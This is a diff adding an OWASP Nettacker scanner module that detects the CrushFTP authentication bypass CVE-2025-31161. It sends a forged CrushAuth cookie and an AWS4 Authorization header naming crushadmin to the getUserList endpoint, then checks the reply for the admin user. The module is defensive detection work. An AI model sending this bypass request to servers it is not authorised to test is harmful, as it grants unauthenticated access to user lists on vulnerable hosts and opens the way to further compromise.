@@ -1,0 +1,60 @@
+info:
+  name: crushftp_cve_2025_31161_vuln
+  author: OWASP Nettacker Team
+  severity: 9.8
+  description: >
+    This module checks for a critical improper authentication vulnerability in CrushFTP
+    (CVE-2025-31161). The vulnerability allows unauthenticated users to access sensitive
+    files and execute arbitrary commands, leading to potential data exposure and system
+    compromise.
+
+  reference:
+    - https://ccb.belgium.be/advisories/warning-critical-improper-authentication-vulnerability-crushftp-patch-immediately
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-31161
+    - https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation
+
+  profiles:
+    - crushftp
+    - vuln
+    - vulnerability
+    - http
+    - high_severity
+
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Cookie: "CrushAuth=1111111111_111111111111111111111111111111111"
+          Authorization: "AWS4-HMAC-SHA256 Credential=crushadmin/"
+          Connection: "close"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors: []
+            data:
+              paths:
+                - "/WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=1111"
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 8080
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+            content:
+              regex: '<user_list_subitem>crushadmin</user_list_subitem>'
+              reverse: false
